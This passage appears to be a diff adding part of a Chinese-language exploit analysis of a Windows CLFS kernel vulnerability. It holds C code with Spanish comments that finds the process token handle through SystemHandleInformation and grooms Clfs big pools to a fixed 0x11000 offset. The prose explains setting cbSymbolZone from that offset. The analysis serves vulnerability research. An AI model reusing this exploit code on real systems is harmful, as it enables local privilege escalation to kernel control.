@@ -1,0 +1,152 @@
+
+```
+int checkAccessToken() {
+    int v8 = 0; // todavia no se que es
+    PHANDLE TokenHandle = 0; // 
+    int savedHprocess = 0;
+    NTSTATUS status2;
+    ULONG size2;
+    NTSTATUS status3;
+    UINT64 v11 = 0;
+    PUINT v12 = 0;
+
+    user32 = LoadLibraryW(L"user32.dll");
+    int currentpid = GetCurrentProcessId();
+
+    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, currentpid);
+    if (!hProcess) {
+        printf("[!] OpenProcess failed with error %d\n", GetLastError());
+    }
+    printf("[+] hProcess: 0x%x\n", hProcess);
+
+    savedHprocess = (UINT)hProcess;
+
+    if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hProcess)) {
+        printf("[!] OpenProcessToken failed with error %d\n", GetLastError());
+        return 0;
+    }
+    TokenHandle = &hProcess;
+    printf("[+] Token handle: 0x%x\n", TokenHandle);
+
+    VOID* v10 = malloc(0x20);
+    if (!v10) { exit(1); }
+
+    status2 = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, v10, 32, &size2);
+    if (!*(PUINT)v10) {
+        exit(1);
+    }
+
+    if (status2 == 0xC0000004 || NT_SUCCESS(status2)) // STATUS_INFO_LENGTH_MISMATCH
+    {
+        LocalFree(v10);
+        v10 = malloc(size2);
+
+        printf("[+] Structure Address %p\n", v10);
+        status3 = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, v10, size2, &size2);
+        printf("[+] Number of Handles: 0x%x\n", *(PULONG)v10);
+    }
+
+    v12 = (PUINT)v10 + 3;
+    printf("[+] Direccion: 0x%p  pid: %x\n", (v12 - 1), *(v12 - 1));
+
+    while (*(v12 - 1) != GetCurrentProcessId() || *(BYTE*)v12 != 5 || *(PUINT16)TokenHandle != *(PUINT16)((PCHAR)v12 + 2)) {
+        //              printf("pasada %d\n",  v11);
+        v11++;
+        v12 = (PUINT)v12 + 6;
+        //                  printf("v12 = %p\n", v12);
+        if (v11 >= *(PUINT)v10) {
+            printf("[+] Termino\n");
+            break;
+        }
+
+    }
+    printf("[+] Valor: %x\n", *(PUINT16)v12);
+    printf("[+] Salida del while\n");
+    return 0;
+}
+```
+
+# 获取Base Block的bigpools间的偏移量
+
+利用代码中使用了以下技术来确保确保最后申请的2个blf文件的`MetadataBlock`相隔距离正好为`0x11000`字节
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202402/865065_5ZX3572BWPGM2UX.png)
+
+在创建每个新的`MyLog_xxx.blf`基础文件后，调用`ZwQuerySystemInformation`函数，第一个参数为`SystemBigPoolInformation(0x42)`。如果函数返回`NTSTATUS`成功，检索到的信息将存储在第二个参数`SystemInformation`中，该参数是一个指向`SYSTEM_BIGPOOL_ENTRY`结构的指针，该结构在运行时保存所有的bigpool内存。
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202306/865065_MAPABCWJ46G2VHT.png)
+
+bigpool中的分配数量存储在第一个名为`Count`的字段中。在第二个字段中有一个名为`SYSTEM_BIGPOOL_ENTRY`的结构数组。
+
+![图片描述](https://bbs.kanxue.com/upload/attach/202306/865065_BQU3PW3GCM3YK2Q.png)
+
+从那里我们将搜索“`Clfs`”标签和大小`0x7a00`的所有结构。`VirtualAddress`存储在名为`kernelAddrArray`的数组中，该数组是具有`CLFS`标记且大小为`0x7a00`的每个结构的第一个字段。
+
+接下来的循环中，代码检查第N个BLF的基本块和第N+1个BLF的基本块之间的偏移量是否恒定。直到偏移量恒定，代码才会跳出循环。常量值为`0x11000`。将常量值加上`0x14B`，设置为Base Record Header中的`cbSymbolZone`字段。
+
+```
+NTSTATUS WINAPI ZwQuerySystemInformation(
+    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    _Inout_   PVOID                    SystemInformation,
+    _In_      ULONG                    SystemInformationLength,
+    _Out_opt_ PULONG                   ReturnLength
+);
+```
+
+[6ecK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2Y4k6h3!0X3k6X3y4Z5j5i4m8H3k6h3I4D9i4K6u0W2j5$3!0E0i4K6u0r3M7%4c8#2k6r3W2W2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6C8L8g2)9J5c8X3&6@1L8%4y4C8M7X3&6D9i4K6u0r3j5i4m8A6i4K6u0r3k6i4S2Q4x3V1k6K6P5i4y4A6L8X3k6G2i4K6u0r3j5X3W2Y4M7r3!0G2L8q4)9#2k6X3g2F1N6s2u0&6i4K6u0W2K9s2c8E0](https://bbs.kanxue.com/elink@7bcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2Y4k6h3!0X3k6X3y4Z5j5i4m8H3k6h3I4D9i4K6u0W2j5$3!0E0i4K6u0r3M7%4c8#2k6r3W2W2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6C8L8g2)9J5c8X3&6@1L8%4y4C8M7X3&6D9i4K6u0r3j5i4m8A6i4K6u0r3k6i4S2Q4x3V1k6K6P5i4y4A6L8X3k6G2i4K6u0r3j5X3W2Y4M7r3!0G2L8q4)9#2k6X3g2F1N6s2u0&6i4K6u0W2K9s2c8E0)
+
+```
+VOID GetOffsetBetweenPools() {
+    UINT64 a2 = 0;
+    PUINT64 p_a2 = &a2;
+
+    WCHAR* buf = (WCHAR*)malloc(0x1000);
+    do
+    {
+        while (1)
+        {
+            while (1)
+            {
+                do
+                {
+                    HANDLE logFile1;
+                    do
+                    {
+                        v26 = v24;
+                        memset(buf, 0, 0x1000);
+                        unsigned int rnum = rand();
+                        wsprintfW((LPWSTR)buf, L"%s_%d", stored_env_fname, rnum);
+                        logFile1 = CreateLogFile((LPWSTR)buf, 0xc0010000, 3, 0, 4, 0);
+                    } while (logFile1 == (HANDLE)-1);
+
+                    int* handleArray = (INT*)malloc(4);
+                    *handleArray = (INT)logFile1;
+                    getBigPoolInfo(p_a2); // SystemBigPoolInformation
+                    //      printf("[+] Last BigPoolAddress of Clfs tag --> %p\n [+]Total Clfs tags --> 0x%x\n", a2, num_of_CLFS);
+
+                    v24 = p_a2[0];
+
+                } while (!v26);
+
+                v31b = p_a2[0] - v26;//v32存储最后找到的两个正确池的VirtualAddress之间的差异
+                v32 = v26 - p_a2[0];
+
+                if (v31b > 0) {
+                    v32 = v31b;
+                }
+                //printf("[+] Distancia --> %x\n", v32);
+                if (v23) break;
+                v23 = v32;
+            }
+
+            if (v23 == v32) break;
+            v22 = 0;
+            v23 = v32;
+        }
+
+        ++v22;
+    } while (v22 < 5);
+    //  printf("[+] v22 --> %p\n", v22);
+    return;
+}
+```
